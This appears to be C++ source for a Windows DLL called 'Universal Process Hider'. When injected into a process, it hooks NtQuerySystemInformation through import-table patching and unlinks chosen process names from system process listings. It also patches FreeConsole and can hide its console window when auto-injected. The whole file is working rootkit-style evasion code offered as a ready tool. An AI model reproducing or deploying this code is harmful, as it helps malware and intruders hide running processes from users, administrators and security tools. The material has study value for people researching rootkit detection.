#define _CRT_SECURE_NO_WARNINGS
#define CURL_STATICLIB

#include "framework.h"

using json = nlohmann::json;

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)(
	GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")
	);

__forceinline void print_good(const char* format)
{
	std::cout << "[" << "\033[92m" << "+" << "\033[0m" << "] ";
	std::cout << "\033[31m" << format << "\033[0m" << std::endl;

	//std::cout << "[+] ";
	//printf(format);
}
__forceinline void print_info(const char* format)
{
	std::cout << "[" << "\033[96m" << "*" << "\033[0m" << "] ";
	std::cout << "\033[33m" << format << "\033[0m";
	//
   // std::cout << "[*] ";
   // printf(format);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			StartHook();
			break;
	}
	return TRUE;
}

bool EnableVTMode()
{
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
	if (hOut == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD dwMode = 0;
	if (!GetConsoleMode(hOut, &dwMode))
	{
		return false;
	}

	dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	if (!SetConsoleMode(hOut, dwMode))
	{
		return false;
	}
	return true;
}

std::vector<std::string> processes{};

void StartHook() {
  bool valid = true;
	if (valid == true) {
		char path[MAX_PATH];
		HMODULE hm = NULL;

		if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
			GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
			(LPCSTR)&EnableVTMode, &hm) == 0)
		{
			int ret = GetLastError();
			fprintf(stderr, "GetModuleHandle failed, error = %d\n", ret);
		}
		if (GetModuleFileName(hm, path, sizeof(path)) == 0)
		{
			int ret = GetLastError();
			fprintf(stderr, "GetModuleFileName failed, error = %d\n", ret);
		}
		//std::cout << path << std::endl;
		std::string spath = path;
		spath = spath.substr(0, spath.find_last_of("\\/"));
		spath += "\\config.json";
		//std::cout << spath;

		if (std::filesystem::exists(spath)) {
			std::ifstream i(spath);
			json j;
			i >> j;
			//std::cout << "1";
			if (j["auto-inject"] == true) {
				//std::cout << "2";
				ShowWindow(GetConsoleWindow(), SW_HIDE);
			}
			else {
				//std::cout << "3";
				DWORD nOldProtect;
				if (!VirtualProtect(FreeConsole, 1, PAGE_EXECUTE_READWRITE, &nOldProtect))
					return;
				*(BYTE*)(FreeConsole) = 0xC3;
				if (!VirtualProtect(FreeConsole, 1, nOldProtect, &nOldProtect))
					return;
				AllocConsole();
				freopen("CONOUT$", "w", stdout);
				freopen("CONIN$", "r", stdin);
				HWND ConsoleHandle = GetConsoleWindow();
				SetWindowPos(ConsoleHandle, HWND_TOPMOST, 50, 20, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
				ShowWindow(GetConsoleWindow(), SW_SHOW);

				EnableVTMode();
				SetConsoleTitleA("UPH - Universal Process Hider");

				print_info("Name Of Process To Hide(With Extension[.exe, etc]): ");
				std::string tempname;
				std::cin >> tempname;
				processes.push_back(tempname);
				ShowWindow(GetConsoleWindow(), SW_HIDE);
			}
			//std::cout << "4";
			for (const auto& item : j["hide"].items())
			{
				processes.push_back(item.value());
			}
			//std::cout << "6";
		}
		MODULEINFO modInfo = { 0 };
		HMODULE hModule = GetModuleHandle(0);
		GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

		LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;

		PIMAGE_DOS_HEADER		pIDH = (PIMAGE_DOS_HEADER)pAddress;
		PIMAGE_NT_HEADERS		pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
		PIMAGE_OPTIONAL_HEADER	pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
		PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress +
			pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		for (; pIID->Characteristics; pIID++)
			if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
				break;

		PIMAGE_THUNK_DATA		pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA		pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
		PIMAGE_IMPORT_BY_NAME	pIIBN;

		for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
			pIIBN = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
			if (!strcmp("NtQuerySystemInformation", (char*)pIIBN->Name))
				break;
			pFirstThunkTest++;
		}

		DWORD dwOld = NULL;
		VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
		pFirstThunkTest->u1.Function = (SIZE_T)HookedNtQuerySystemInformation;
		VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
		CloseHandle(hModule);
	}
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(

	__in		SYSTEM_INFORMATION_CLASS	SystemInformationClass,
	__inout		PVOID						SystemInformation,
	__in		ULONG						SystemInformationLength,
	__out_opt	PULONG						ReturnLength

) {

	NTSTATUS status = OriginalNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
	);

	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {


		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;


		do {

			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			for (std::string str : processes) {
				std::wstring widestr = std::wstring(str.begin(), str.end());
				const wchar_t* widecstr = widestr.c_str();

				if (!wcsncmp(pNext->ImageName.Buffer, widecstr, pNext->ImageName.Length)) {
					if (!pNext->NextEntryOffset)
						pCurrent->NextEntryOffset = 0;
					else
						pCurrent->NextEntryOffset += pNext->NextEntryOffset;

				}
			}
		} while (pCurrent->NextEntryOffset != 0);

	}

	return status;

}
